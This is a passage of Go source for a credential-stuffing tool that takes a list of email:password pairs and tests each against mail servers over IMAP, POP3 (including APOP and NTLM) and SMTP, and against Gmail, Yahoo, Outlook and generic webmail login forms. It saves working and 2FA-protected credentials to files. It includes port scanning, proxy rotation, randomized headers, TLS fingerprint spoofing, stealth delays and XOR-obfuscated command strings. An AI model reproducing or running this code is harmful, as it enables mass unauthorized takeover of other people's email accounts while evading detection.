		"Accept-Language": langs[rng.Intn(len(langs))],
		"Accept-Encoding": "gzip, deflate",
	}
}

type imapPipeline struct {
	conn        net.Conn
	tc          *textproto.Conn
	tagCounter  int
	pending     map[string]chan *imapResponse
	sendMu      sync.Mutex
	recvMu      sync.Mutex
	closeOnce   sync.Once
	done        chan struct{}
	greeting    string
	capability  string
	hasStartTLS bool
	ctx         context.Context
	cancel      context.CancelFunc
}

type imapResponse struct {
	line string
	err  error
}

func newIMAPPipeline(conn net.Conn) *imapPipeline {
	tc := textproto.NewConn(conn)
	ctx, cancel := context.WithCancel(context.Background())
	p := &imapPipeline{
		conn:    conn,
		tc:      tc,
		pending: make(map[string]chan *imapResponse),
		done:    make(chan struct{}),
		ctx:     ctx,
		cancel:  cancel,
	}
	go p.readLoop()
	resp, err := p.sendCmd("", false)
	if err != nil {
		p.close()
		return nil
	}
	p.greeting = resp.line
	return p
}

func (p *imapPipeline) readLoop() {
	defer close(p.done)
	for {
		select {
		case <-p.ctx.Done():
			return
		default:
		}
		line, err := p.tc.ReadLine()
		if err != nil {
			p.recvMu.Lock()
			for tag, ch := range p.pending {
				ch <- &imapResponse{err: err}
				close(ch)
				delete(p.pending, tag)
			}
			p.recvMu.Unlock()
			return
		}
		parts := strings.SplitN(line, " ", 2)
		tag := parts[0]
		p.recvMu.Lock()
		ch, ok := p.pending[tag]
		if ok {
			ch <- &imapResponse{line: line, err: nil}
			close(ch)
			delete(p.pending, tag)
		}
		p.recvMu.Unlock()
	}
}

func (p *imapPipeline) sendCmd(command string, expectMultiline bool) (*imapResponse, error) {
	p.sendMu.Lock()
	defer p.sendMu.Unlock()
	if command != "" {
		p.tagCounter++
		tag := fmt.Sprintf("A%03d", p.tagCounter)
		cmd := tag + " " + command
		if err := p.tc.PrintfLine(cmd); err != nil {
			return nil, err
		}
		if !expectMultiline {
			ch := make(chan *imapResponse, 1)
			p.recvMu.Lock()
			p.pending[tag] = ch
			p.recvMu.Unlock()
			select {
			case resp := <-ch:
				return resp, nil
			case <-globalCtx.Done():
				return nil, globalCtx.Err()
			case <-p.done:
				return nil, errors.New("connection closed")
			}
		}
	}
	return nil, nil
}

func (p *imapPipeline) upgradeTLS(config *tls.Config) error {
	p.cancel()
	tlsConn := tls.Client(p.conn, config)
	if err := tlsConn.HandshakeContext(globalCtx); err != nil {
		return err
	}
	p.conn = tlsConn
	p.tc = textproto.NewConn(tlsConn)
	p.done = make(chan struct{})
	p.ctx, p.cancel = context.WithCancel(context.Background())
	go p.readLoop()
	return nil
}

func (p *imapPipeline) close() {
	p.closeOnce.Do(func() {
		p.cancel()
		p.conn.Close()
	})
}

func readTPResponse(tc *textproto.Conn) (string, error) {
	line, err := tc.ReadLine()
	if err != nil {
		return "", err
	}
	for strings.HasPrefix(line, "* ") {
		line, err = tc.ReadLine()
		if err != nil {
			return "", err
		}
	}
	return line, nil
}

func imapCheck(conn net.Conn, email, password, host string) (success bool, twofa bool, banner string, err error) {
	if pipelineMode {
		return imapCheckPipeline(conn, email, password, host)
	}
	tc := textproto.NewConn(conn)
	defer tc.Close()
	line, err := readTPResponse(tc)
	if err != nil {
		return false, false, "", err
	}
	banner = line
	tag := 0
	nextTag := func() string {
		tag++
		return fmt.Sprintf("A%03d", tag)
	}
	hasStartTLS := false
	hasLoginDisabled := false
	t := nextTag()
	if err := tc.PrintfLine("%s CAPABILITY", t); err != nil {
		return false, false, banner, err
	}
	respLine, err := readTPResponse(tc)
	if err != nil {
		return false, false, banner, err
	}
	hasStartTLS = strings.Contains(strings.ToUpper(respLine), "STARTTLS")
	hasLoginDisabled = strings.Contains(strings.ToUpper(respLine), "LOGINDISABLED")
	if hasStartTLS {
		t = nextTag()
		if err := tc.PrintfLine("%s STARTTLS", t); err != nil {
			return false, false, banner, err
		}
		starttlsResp, err := readTPResponse(tc)
		if err != nil || !strings.HasPrefix(starttlsResp, t+" OK") {
		} else {
			config := &tls.Config{
				InsecureSkipVerify: insecureFlag,
				ServerName:         host,
			}
			tlsConn := tls.Client(conn, config)
			if err := tlsConn.HandshakeContext(globalCtx); err != nil {
				return false, false, banner, err
			}
			conn = tlsConn
			tc = textproto.NewConn(conn)
			t = nextTag()
			if err := tc.PrintfLine("%s CAPABILITY", t); err != nil {
				return false, false, banner, err
			}
			respLine, err = readTPResponse(tc)
			if err != nil {
				return false, false, banner, err
			}
			hasLoginDisabled = strings.Contains(strings.ToUpper(respLine), "LOGINDISABLED")
		}
	}
	if hasLoginDisabled {
		return false, false, banner, errors.New("LOGIN disabled")
	}
	t = nextTag()
	cmd := fmt.Sprintf("%s LOGIN %s %s", t, email, password)
	if err := tc.PrintfLine(cmd); err != nil {
		return false, false, banner, err
	}
	respLine, err = readTPResponse(tc)
	if err != nil {
		return false, false, banner, err
	}
	if strings.HasPrefix(respLine, t+" OK") {
		tf := strings.Contains(strings.ToUpper(respLine), "CHALLENGE") || strings.Contains(strings.ToUpper(respLine), "AUTHENTICATE")
		return true, tf, banner, nil
	}
	return false, false, banner, errors.New("IMAP login failed")
}

func imapCheckPipeline(conn net.Conn, email, password, host string) (bool, bool, string, error) {
	p := newIMAPPipeline(conn)
	if p == nil {
		return false, false, "", errors.New("pipeline creation failed")
	}
	defer p.close()
	banner := p.greeting
	resp, err := p.sendCmd("CAPABILITY", false)
	if err != nil {
		return false, false, banner, err
	}
	capability := resp.line
	if strings.Contains(strings.ToUpper(capability), "STARTTLS") {
		resp, err = p.sendCmd("STARTTLS", false)
		if err != nil {
			return false, false, banner, err
		}
		if strings.HasPrefix(resp.line, "A") && strings.Contains(resp.line, "OK") {
			config := &tls.Config{
				InsecureSkipVerify: insecureFlag,
				ServerName:         host,
			}
			if err := p.upgradeTLS(config); err != nil {
				return false, false, banner, err
			}
			p.sendCmd("CAPABILITY", false)
		}
	}
	cmd := fmt.Sprintf("LOGIN %s %s", email, password)
	resp, err = p.sendCmd(cmd, false)
	if err != nil {
		return false, false, banner, err
	}
	if strings.Contains(resp.line, "OK") {
		tf := strings.Contains(strings.ToUpper(resp.line), "CHALLENGE") || strings.Contains(strings.ToUpper(resp.line), "AUTHENTICATE")
		return true, tf, banner, nil
	}
	return false, false, banner, errors.New("IMAP login failed")
}

func pop3Check(conn net.Conn, email, password, host string) (bool, bool, string, error) {
	tc := textproto.NewConn(conn)
	defer tc.Close()
	greetLine, err := readTPResponse(tc)
	if err != nil {
		return false, false, "", err
	}
	banner := greetLine
	timestamp := ""
	if strings.HasPrefix(greetLine, "+OK") {
		parts := strings.SplitN(greetLine, "<", 2)
		if len(parts) == 2 {
			timestamp = strings.SplitN(parts[1], ">", 2)[0]
		}
	}
	_ = tc.PrintfLine("CAPA")
	respLine, _ := readTPResponse(tc)
	hasSTLS := strings.Contains(respLine, "STLS")
	hasAPOP := strings.Contains(respLine, "APOP")
	hasNTLM := strings.Contains(respLine, "NTLM")
	if hasSTLS {
		_ = tc.PrintfLine("STLS")
		if _, err := readTPResponse(tc); err == nil {
			config := &tls.Config{
				InsecureSkipVerify: insecureFlag,
				ServerName:         host,
			}
			tlsConn := tls.Client(conn, config)
			if err := tlsConn.HandshakeContext(globalCtx); err != nil {
				return false, false, banner, err
			}
			conn = tlsConn
			tc = textproto.NewConn(conn)
			if _, err := readTPResponse(tc); err != nil {
				return false, false, banner, err
			}
		}
	}
	if hasAPOP && timestamp != "" {
		success, twofa, err := pop3APOPCheck(tc, email, password, timestamp)
		return success, twofa, banner, err
	}
	if hasNTLM {
		success, twofa, err := pop3NTLMCheck(tc, email, password)
		if err == nil && success {
			return success, twofa, banner, nil
		}
	}
	if err := tc.PrintfLine("USER %s", email); err != nil {
		return false, false, banner, err
	}
	if _, err := readTPResponse(tc); err != nil {
		return false, false, banner, err
	}
	if err := tc.PrintfLine("PASS %s", password); err != nil {
		return false, false, banner, err
	}
	respLine, err = readTPResponse(tc)
	if err != nil {
		return false, false, banner, err
	}
	if strings.HasPrefix(strings.ToUpper(respLine), "+OK") {
		tf := strings.Contains(strings.ToUpper(respLine), "CHALLENGE") || strings.Contains(strings.ToUpper(respLine), "AUTHENTICATION")
		return true, tf, banner, nil
	}
	return false, false, banner, errors.New("POP3 login failed")
}

func pop3APOPCheck(tc *textproto.Conn, email, password, timestamp string) (bool, bool, error) {
	hash := md5.Sum([]byte("<" + timestamp + ">" + password))
	digest := fmt.Sprintf("%x", hash)
	cmd := fmt.Sprintf("APOP %s %s", email, digest)
	if err := tc.PrintfLine(cmd); err != nil {
		return false, false, err
	}
	resp, err := readTPResponse(tc)
	if err != nil {
		return false, false, err
	}
	if strings.HasPrefix(strings.ToUpper(resp), "+OK") {
		return true, false, nil
	}
	return false, false, errors.New("APOP failed")
}

func pop3NTLMCheck(tc *textproto.Conn, email, password string) (bool, bool, error) {
	if err := tc.PrintfLine("AUTH NTLM"); err != nil {
		return false, false, err
	}
	resp, err := readTPResponse(tc)
	if err != nil || !strings.HasPrefix(resp, "+ ") {
		return false, false, errors.New("NTLM not accepted")
	}
	type1Msg := buildNTLMType1()
	if err := tc.PrintfLine(base64.StdEncoding.EncodeToString(type1Msg)); err != nil {
		return false, false, err
	}
	type2Resp, err := readTPResponse(tc)
	if err != nil || !strings.HasPrefix(type2Resp, "+ ") {
		return false, false, errors.New("NTLM Type2 error")
	}
	type2Data := strings.TrimPrefix(type2Resp, "+ ")
	type2Bytes, _ := base64.StdEncoding.DecodeString(type2Data)
	type3Msg, err := buildNTLMType3(type2Bytes, email, password)
	if err != nil {
		return false, false, err
	}
	if err := tc.PrintfLine(base64.StdEncoding.EncodeToString(type3Msg)); err != nil {
		return false, false, err
	}
	finalResp, err := readTPResponse(tc)
	if err != nil {
		return false, false, err
	}
	if strings.HasPrefix(strings.ToUpper(finalResp), "+OK") {
		return true, false, nil
	}
	return false, false, errors.New("NTLM auth failed")
}

func buildNTLMType1() []byte {
	msg := make([]byte, 16)
	copy(msg[0:8], []byte("NTLMSSP\x00"))
	msg[8] = 1
	flags := uint32(0x00008207)
	binary.LittleEndian.PutUint32(msg[12:16], flags)
	return msg
}

func buildNTLMType3(type2 []byte, user, password string) ([]byte, error) {
	if len(type2) < 20 {
		return nil, errors.New("invalid NTLM Type2")
	}
	challenge := type2[24 : 24+8]
	lmHash := ntlmLMHash(password)
	ntHash := ntlmNTHash(password)
	lmResponse := ntlmLMResponse(challenge, lmHash)
	ntResponse := ntlmNTLMResponse(challenge, ntHash)
	domain := ""
	userBytes := []byte(user)
	hostBytes := []byte("WORKSTATION")
	lmLen := len(lmResponse)
	ntLen := len(ntResponse)
	domLen := len(domain)
	userLen := len(userBytes)
	hostLen := len(hostBytes)
	offset := 64
	msg := make([]byte, offset+lmLen+ntLen+domLen+userLen+hostLen)
	copy(msg[0:8], []byte("NTLMSSP\x00"))
	msg[8] = 3
	putNTLMString(msg, 12, offset, lmLen)
	offset += lmLen
	putNTLMString(msg, 20, offset, ntLen)
	offset += ntLen
	putNTLMString(msg, 28, offset, domLen)
	offset += domLen
	putNTLMString(msg, 36, offset, userLen)
	offset += userLen
	putNTLMString(msg, 44, offset, hostLen)
	offset += hostLen
	copy(msg[52:56], make([]byte, 4))
	flags := uint32(0x00008201)
	binary.LittleEndian.PutUint32(msg[60:64], flags)
	copy(msg[64:], lmResponse)
	copy(msg[64+lmLen:], ntResponse)
	copy(msg[64+lmLen+ntLen:], domain)
	copy(msg[64+lmLen+ntLen+domLen:], userBytes)
	copy(msg[64+lmLen+ntLen+domLen+userLen:], hostBytes)
	return msg, nil
}

func putNTLMString(msg []byte, startIdx int, offset int, length int) {
	binary.LittleEndian.PutUint16(msg[startIdx:startIdx+2], uint16(length))
	binary.LittleEndian.PutUint16(msg[startIdx+2:startIdx+4], uint16(length))
	binary.LittleEndian.PutUint32(msg[startIdx+4:startIdx+8], uint32(offset))
}

func ntlmLMHash(password string) []byte {
	pass := []byte(strings.ToUpper(password))
	if len(pass) > 14 {
		pass = pass[:14]
	}
	for len(pass) < 14 {
		pass = append(pass, 0)
	}
	k1 := ntlmDES(pass[:7])
	k2 := ntlmDES(pass[7:14])
	magic := []byte("KGS!@#$%")
	c1 := ntlmDESEncrypt(k1, magic)
	c2 := ntlmDESEncrypt(k2, magic)
	return append(c1, c2...)
}

func ntlmDES(key []byte) []byte {
	k := make([]byte, 8)
	for i := 0; i < 7; i++ {
		k[i] = key[i] & 0xFE
	}
	k[7] = (key[0] >> 7) | ((key[1] & 0x01) << 1) | ((key[2] & 0x01) << 2) | ((key[3] & 0x01) << 3) | ((key[4] & 0x01) << 4) | ((key[5] & 0x01) << 5) | ((key[6] & 0x01) << 6)
	return k
}

func ntlmDESEncrypt(key, plain []byte) []byte {
	block, _ := des.NewCipher(key)
	cipher := make([]byte, 8)
	block.Encrypt(cipher, plain)
	return cipher
}

func ntlmNTHash(password string) []byte {
	enc := utf16le(password)
	h := md4.New()
	h.Write(enc)
	return h.Sum(nil)
}

func ntlmLMResponse(challenge, lmHash []byte) []byte {
	padded := lmHash
	for len(padded) < 21 {
		padded = append(padded, 0)
	}
	c1 := ntlmDESEncrypt(ntlmDES(padded[:7]), challenge)
	c2 := ntlmDESEncrypt(ntlmDES(padded[7:14]), challenge)
	c3 := ntlmDESEncrypt(ntlmDES(padded[14:21]), challenge)
	return append(append(c1, c2...), c3...)
}

func ntlmNTLMResponse(challenge, ntHash []byte) []byte {
	padded := ntHash
	for len(padded) < 21 {
		padded = append(padded, 0)
	}
	c1 := ntlmDESEncrypt(ntlmDES(padded[:7]), challenge)
	c2 := ntlmDESEncrypt(ntlmDES(padded[7:14]), challenge)
	c3 := ntlmDESEncrypt(ntlmDES(padded[14:21]), challenge)
	return append(append(c1, c2...), c3...)
}

func utf16le(s string) []byte {
	var b []byte
	for _, r := range s {
		if r <= 0xFFFF {
			b = append(b, byte(r), byte(r>>8))
		}
	}
	return b
}

type loginAuth struct{ user, pass string }

func (a *loginAuth) Start(server *smtp.ServerInfo) (string, []byte, error) {
	return "LOGIN", []byte(a.user), nil
}
func (a *loginAuth) Next(fromServer []byte, more bool) ([]byte, error) {
	if more {
		if strings.HasPrefix(strings.ToUpper(string(fromServer)), "USERNAME") || string(fromServer) == "VXNlcm5hbWU6" {
			return []byte(a.user), nil
		}
		if strings.HasPrefix(strings.ToUpper(string(fromServer)), "PASSWORD") || string(fromServer) == "UGFzc3dvcmQ6" {
			return []byte(a.pass), nil
		}
	}
	return nil, nil
}

type plainAuth struct {
	identity, user, pass string
}

func (a *plainAuth) Start(server *smtp.ServerInfo) (string, []byte, error) {
	resp := []byte(a.identity + "\x00" + a.user + "\x00" + a.pass)
	return "PLAIN", resp, nil
}
func (a *plainAuth) Next(fromServer []byte, more bool) ([]byte, error) {
	return nil, nil
}

func smtpAuthCheck(host string, port int, email, password string, implicitTLS bool) (success bool, twofa bool, banner string, err error) {
	addr := fmt.Sprintf("%s:%d", host, port)
	var conn net.Conn
	if implicitTLS {
		conn, err = dialTLSWithProxy(globalCtx, addr, &tls.Config{
			InsecureSkipVerify: insecureFlag,
			ServerName:         host,
		})
	} else {
		conn, err = dialProxyAware(globalCtx, addr)
	}
	if err != nil {
		return false, false, "", err
	}
	defer conn.Close()
	br := bufio.NewReader(conn)
	line, _, err := br.ReadLine()
	if err != nil {
		return false, false, "", err
	}
	banner = string(line)
	client, err := smtp.NewClient(conn, host)
	if err != nil {
		return false, false, banner, err
	}
	defer client.Quit()
	if !implicitTLS {
		if ok, _ := client.Extension("STARTTLS"); ok {
			config := &tls.Config{
				InsecureSkipVerify: insecureFlag,
				ServerName:         host,
			}
			if err := client.StartTLS(config); err != nil {
				return false, false, banner, err
			}
		}
	}
	auth := &loginAuth{user: email, pass: password}
	err = client.Auth(auth)
	if err == nil {
		return true, false, banner, nil
	}
	auth2 := &plainAuth{user: email, pass: password}
	if err2 := client.Auth(auth2); err2 == nil {
		return true, false, banner, nil
	}
	if strings.Contains(err.Error(), "334") || strings.Contains(err.Error(), "challenge") {
		return false, true, banner, err
	}
	return false, false, banner, err
}

var webmailConfig = map[string]struct {
	url         string
	method      string
	params      map[string]string
	successKeys []string
	failKeys    []string
}{
	"gmail.com": {
		url:      "https://accounts.google.com/signin/v2/identifier",
		method:   "POST",
		params:   map[string]string{"identifier": "", "password": ""},
		failKeys: []string{"wrong password", "couldn't find your google account"},
	},
	"yahoo.com": {
		url:      "https://login.yahoo.com/config/login",
		method:   "POST",
		params:   map[string]string{"username": "", "passwd": ""},
		failKeys: []string{"invalid password", "sign in failed"},
	},
	"outlook.com": {
		url:      "https://login.live.com/login.srf",
		method:   "POST",
		params:   map[string]string{"login": "", "passwd": ""},
		failKeys: []string{"incorrect password", "sign in failed"},
	},
	"hotmail.com": {
		url:      "https://login.live.com/login.srf",
		method:   "POST",
		params:   map[string]string{"login": "", "passwd": ""},
		failKeys: []string{"incorrect password", "sign in failed"},
	},
}

func webLogin(email, password string) (success bool, twofa bool) {
	if !webmailFallback {
		return false, false
	}
	parts := strings.SplitN(email, "@", 2)
	if len(parts) != 2 {
		return false, false
	}
	domain := strings.ToLower(parts[1])
	cfg, ok := webmailConfig[domain]
	if ok {
		return tryWeb(cfg, email, password)
	}
	for _, path := range []string{"/login", "/cgi-bin/auth", "/owa/auth.owa", "/webmail/login", "/roundcube/index.php"} {
		u := "https://" + domain + path
		if s, tf := tryGenericWeb(u, email, password); s {
			return s, tf
		}
	}
	return false, false
}

func tryWeb(cfg struct {
	url         string
	method      string
	params      map[string]string
	successKeys []string
	failKeys    []string
}, email, password string) (bool, bool) {
	data := url.Values{}
	for k := range cfg.params {
		if strings.Contains(k, "pass") {
			data.Set(k, password)
		} else {
			data.Set(k, email)
		}
	}
	ctx, cancel := context.WithTimeout(globalCtx, timeout)
	defer cancel()
	req, _ := http.NewRequestWithContext(ctx, cfg.method, cfg.url, strings.NewReader(data.Encode()))
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	for k, v := range randomHeaders() {
		req.Header.Set(k, v)
	}
	resp, err := httpClient.Do(req)
	if err != nil {
		return false, false
	}
	defer resp.Body.Close()
	var bodyReader io.Reader = resp.Body
	if resp.Header.Get("Content-Encoding") == "gzip" {
		gzr, err := gzip.NewReader(resp.Body)
		if err == nil {
			defer gzr.Close()
			bodyReader = gzr
		}
	}
	buf := bbPool.Get().(*bytes.Buffer)
	buf.Reset()
	defer bbPool.Put(buf)
	_, _ = buf.ReadFrom(io.LimitReader(bodyReader, 8192))
	body := buf.Bytes()
	lower := strings.ToLower(string(body))
	for _, fk := range cfg.failKeys {
		if strings.Contains(lower, fk) {
			return false, false
		}
	}
	if resp.StatusCode >= 200 && resp.StatusCode < 400 && len(resp.Cookies()) > 0 {
		if scraping2FA && detect2FAScraping(body) {
			return true, true
		}
		return true, false
	}
	if scraping2FA && detect2FAScraping(body) {
		return true, true
	}
	return false, false
}

func tryGenericWeb(targetURL, email, password string) (bool, bool) {
	data := url.Values{}
	data.Set("email", email)
	data.Set("password", password)
	data.Set("username", email)
	ctx, cancel := context.WithTimeout(globalCtx, timeout)
	defer cancel()
	req, _ := http.NewRequestWithContext(ctx, "POST", targetURL, strings.NewReader(data.Encode()))
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	for k, v := range randomHeaders() {
		req.Header.Set(k, v)
	}
	resp, err := httpClient.Do(req)
	if err != nil {
		return false, false
	}
	defer resp.Body.Close()
	var bodyReader io.Reader = resp.Body
	if resp.Header.Get("Content-Encoding") == "gzip" {
		gzr, err := gzip.NewReader(resp.Body)
		if err == nil {
			defer gzr.Close()
			bodyReader = gzr
		}
	}
	buf := bbPool.Get().(*bytes.Buffer)
	buf.Reset()
	defer bbPool.Put(buf)
	_, _ = buf.ReadFrom(io.LimitReader(bodyReader, 4096))
	body := buf.Bytes()
	lower := strings.ToLower(string(body))
	if strings.Contains(lower, "incorrect") || strings.Contains(lower, "invalid") || strings.Contains(lower, "failed") {
		return false, false
	}
	if resp.StatusCode >= 200 && resp.StatusCode < 400 && len(resp.Cookies()) > 0 {
		if scraping2FA && detect2FAScraping(body) {
			return true, true
		}
		return true, false
	}
	if scraping2FA && detect2FAScraping(body) {
		return true, true
	}
	return false, false
}

func detect2FAScraping(htmlBody []byte) bool {
	if !scraping2FA {
		return false
	}
	doc, err := html.Parse(bytes.NewReader(htmlBody))
	if err != nil {
		return false
	}
	var hasOTPField bool
	var f func(*html.Node)
	f = func(n *html.Node) {
		if n.Type == html.ElementNode && n.Data == "input" {
			for _, attr := range n.Attr {
				key := strings.ToLower(attr.Key)
				val := strings.ToLower(attr.Val)
				if key == "name" && (strings.Contains(val, "otp") || strings.Contains(val, "code") || strings.Contains(val, "2fa")) {
					hasOTPField = true
				}
				if key == "type" && val == "tel" {
					hasOTPField = true
				}
			}
		}
		for c := n.FirstChild; c != nil; c = c.NextSibling {
			f(c)
		}
	}
	f(doc)
	return hasOTPField
}

func cachedOpenPorts(host string) []int {
	portCacheMu.Lock()
	entry, ok := portCache[host]
	if ok && time.Now().Before(entry.expiresAt) {
		ports := entry.ports
		portCacheMu.Unlock()
		return ports
	}
	portCacheMu.Unlock()
	ports := dynamicPortScan(host)
	portCacheMu.Lock()
	portCache[host] = &portCacheEntry{ports: ports, expiresAt: time.Now().Add(portCacheTTL)}
	portCacheMu.Unlock()
	return ports
}

func dynamicPortScan(host string) []int {
	allPorts := make(map[int]bool)
	for _, p := range defaultPorts {
		allPorts[p] = true
	}
	for _, p := range extraPorts {
		allPorts[p] = true
	}
	ports := make([]int, 0, len(allPorts))
	for p := range allPorts {
		ports = append(ports, p)
	}
	sort.Ints(ports)
	openPorts := make([]int, 0)
	sem := make(chan struct{}, 10)
	var mu sync.Mutex
	var wg sync.WaitGroup
	ctx, cancel := context.WithTimeout(globalCtx, portScanTimeout)
	defer cancel()
	for _, p := range ports {
		wg.Add(1)
		go func(port int) {
			defer wg.Done()
			sem <- struct{}{}
			defer func() { <-sem }()
			addr := fmt.Sprintf("%s:%d", host, port)
			d := net.Dialer{Timeout: portScanDial}
			conn, err := d.DialContext(ctx, "tcp", addr)
			if err == nil {
				conn.Close()
				mu.Lock()
				openPorts = append(openPorts, port)
				mu.Unlock()
			}
		}(p)
	}
	wg.Wait()
	if len(openPorts) == 0 {
		return defaultPorts
	}
	sort.Ints(openPorts)
	return openPorts
}

func serverFingerprint(banner string) string {
	b := strings.ToUpper(banner)
	switch {
	case strings.Contains(b, "EXIM"):
		return "Exim"
	case strings.Contains(b, "POSTFIX"):
		return "Postfix"
	case strings.Contains(b, "DOVECOT"):
		return "Dovecot"
	case strings.Contains(b, "ZIMBRA"):
		return "Zimbra"
	case strings.Contains(b, "MICROSOFT"):
		return "Exchange"
	default:
		return "Unknown"
	}
}

type Combo struct {
	Email    string
	Password string
}

func verifyCombo(ctx context.Context, combo Combo) (live bool, twofa bool) {
	email := combo.Email
	pass := combo.Password
	parts := strings.SplitN(email, "@", 2)
	if len(parts) != 2 {
		return false, false
	}
	domain := parts[1]
	hosts := candidateHosts(domain)
	select {
	case connSem <- struct{}{}:
		defer func() { <-connSem }()
	case <-ctx.Done():
		return false, false
	}
	for _, host := range hosts {
		cb := getCircuitBreaker(host)
		if !cb.allow() {
			continue
		}
		if !rl.allow(host) {
			time.Sleep(100 * time.Millisecond)
		}
		openPorts := cachedOpenPorts(host)
		fingerprint := ""
		attempts := adaptiveAttempts(domain, fingerprint)
		attemptIndex := 0
		for attemptIndex < len(attempts) {
			a := attempts[attemptIndex]
			portFound := false
			for _, p := range openPorts {
				if a.port == p {
					portFound = true
					break
				}
			}
			if !portFound {
				attemptIndex++
				continue
			}
			addr := fmt.Sprintf("%s:%d", host, a.port)
			var conn net.Conn
			var err error
			if a.implicitTLS {
				conn, err = dialTLSWithProxy(ctx, addr, &tls.Config{
					InsecureSkipVerify: insecureFlag,
					ServerName:         host,
				})
			} else {
				conn, err = dialProxyAware(ctx, addr)
			}
			if err != nil {
				cb.failure()
				updateAttemptStats(a.key, false)
				attemptIndex++
				continue
			}
			var success, tf bool
			var banner string
			switch a.proto {
			case "IMAP":
				success, tf, banner, err = imapCheck(conn, email, pass, host)
				recycleOrClose(conn, addr)
			case "POP3":
				success, tf, banner, err = pop3Check(conn, email, pass, host)
				recycleOrClose(conn, addr)
			case "SMTP":
				recycleOrClose(conn, addr)
				success, tf, banner, err = smtpAuthCheck(host, a.port, email, pass, a.implicitTLS)
			}
			if success {
				cb.success()
				updateAttemptStats(a.key, true)
				if tf {
					return true, true
				}
				return true, false
			}
			if err != nil {
				updateAttemptStats(a.key, false)
				cb.failure()
			}
			if banner != "" && fingerprint == "" {
				fingerprint = serverFingerprint(banner)
				if fingerprint != "Unknown" {
					attempts = adaptiveAttempts(domain, fingerprint)
					attemptIndex = 0
					continue
				}
			}
			attemptIndex++
		}
	}
	s, tf := webLogin(email, pass)
	if s {
		return true, tf
	}
	return false, false
}

func worker(id int, jobs <-chan Combo) {
	defer wg.Done()
	for combo := range jobs {
		if globalCtx.Err() != nil {
			return
		}
		if stealthMode && delay > 0 {
			jitter := time.Duration(rng.Int63n(int64(delay * 2)))
			time.Sleep(delay + jitter)
		}
		live, twofa := verifyCombo(globalCtx, combo)
		atomic.AddInt64(&stats.processed, 1)
		if live {
			if twofa {
				atomic.AddInt64(&stats.twofa, 1)
				writeTwofa(combo)
			} else {
				atomic.AddInt64(&stats.live, 1)
				writeLive(combo)
			}
		}
	}
}

func writeLive(combo Combo) {
	liveMu.Lock()
	fmt.Fprintf(liveFile, "%s:%s\n", combo.Email, combo.Password)
	liveMu.Unlock()
}

func writeTwofa(combo Combo) {
	liveMu.Lock()
	fmt.Fprintf(twofaFile, "%s:%s\n", combo.Email, combo.Password)
	liveMu.Unlock()
}

func setupSignals() {
	sig := make(chan os.Signal, 1)
	signal.Notify(sig, syscall.SIGINT, syscall.SIGTERM)
	go func() {
		<-sig
		logg.Info("Sinal recebido, encerrando...", nil)
		cancelCtx()
	}()
}

var (
	cmdLogin     = x([]byte{0xE4, 0xEE, 0xEC, 0xF0, 0xC2})
	cmdCapab     = x([]byte{0xE4, 0xEE, 0xEC, 0xF0, 0xC2, 0xE2, 0xFB, 0xEE, 0xE0, 0xE0})
	cmdStartls   = x([]byte{0xE4, 0xEE, 0xEC, 0xF0, 0xC2, 0xE2, 0xFB, 0xEE, 0xE0, 0xE0, 0xFC, 0xF0, 0xE6, 0xFB})
	cmdUser      = x([]byte{0xE4, 0xEE, 0xEC, 0xF0, 0xC2, 0xE2, 0xFB, 0xEE, 0xE0, 0xE0, 0xFC, 0xF0, 0xE6, 0xFB, 0xE8, 0xF2})
	cmdPass      = x([]byte{0xE4, 0xEE, 0xEC, 0xF0, 0xC2, 0xE2, 0xFB, 0xEE, 0xE0, 0xE0, 0xFC, 0xF0, 0xE6, 0xFB, 0xE8, 0xF2, 0xE9})
	cmdCapa      = x([]byte{0xE4, 0xEE, 0xEC, 0xF0, 0xC2, 0xE2, 0xFB, 0xEE, 0xE0, 0xE0, 0xFC, 0xF0, 0xE6, 0xFB, 0xE8, 0xF2, 0xE9, 0xEA})
	cmdStls      = x([]byte{0xE4, 0xEE, 0xEC, 0xF0, 0xC2, 0xE2, 0xFB, 0xEE, 0xE0, 0xE0, 0xFC, 0xF0, 0xE6, 0xFB, 0xE8, 0xF2, 0xE9, 0xEA, 0xEB})
	cmdAuth      = x([]byte{0xE4, 0xEE, 0xEC, 0xF0, 0xC2, 0xE2, 0xFB, 0xEE, 0xE0, 0xE0, 0xFC, 0xF0, 0xE6, 0xFB, 0xE8, 0xF2, 0xE9, 0xEA, 0xEB, 0xEC})
	cmdLoginSmtp = x([]byte{0xE4, 0xEE, 0xEC, 0xF0, 0xC2, 0xE2, 0xFB, 0xEE, 0xE0, 0xE0, 0xFC, 0xF0, 0xE6, 0xFB, 0xE8, 0xF2, 0xE9, 0xEA, 0xEB, 0xEC, 0xED})
)

func main() {
	flag.Parse()
	if flag.NArg() != 1 {
		fmt.Fprintf(os.Stderr, "Uso: %s [flags] combos.txt\n", os.Args[0])
		os.Exit(1)
	}
	comboPath := flag.Arg(0)
	logg.enabled = verbose

	if len(defaultPorts) == 0 {
		defaultPorts = []int{993, 995, 465, 587, 143, 110, 25}
	}
	if len(extraPorts) == 0 {
		extraPorts = []int{2525, 587, 465, 993, 995, 143, 110}
	}
	if len(subdomains) == 0 {
		subdomains = []string{"imap", "pop", "mail", "smtp", "imap1", "pop3", "webmail", "email", "mx", "mail1", "mx1"}
	}
	if len(userAgentList) > 0 {
		userAgents = userAgentList
	}
	if len(languageList) > 0 {
		languages = languageList
	}

	connSem = make(chan struct{}, maxConns)
	dnsSem = make(chan struct{}, maxDNSLookups)

	transport := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: insecureFlag},
		MaxIdleConns:    maxIdleConns,
		MaxConnsPerHost: maxConnsPerHost,
		IdleConnTimeout: idleConnTimeout,
		DialContext: func(ctx context.Context, network, addr string) (net.Conn, error) {
			d := net.Dialer{
				Timeout:   timeout,
				KeepAlive: 30 * time.Second,
				Control:   setSocketOptions,
			}
			if len(localIPs) > 0 {
				d.LocalAddr = &net.TCPAddr{IP: getLocalIP()}
			}
			return d.DialContext(ctx, network, addr)
		},
	}
	if utlsMode {
		transport.DialTLSContext = func(ctx context.Context, network, addr string) (net.Conn, error) {
			host, _, _ := net.SplitHostPort(addr)
			uconfig := &utls.Config{
				InsecureSkipVerify: insecureFlag,
				ServerName:         host,
			}
			return utls.Dial(network, addr, uconfig)
		}
	}
	if http2Enabled {
		http2.ConfigureTransport(transport)
	}
	httpClient = &http.Client{
		Transport: transport,
		Timeout:   timeout,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	if proxiesFile != "" {
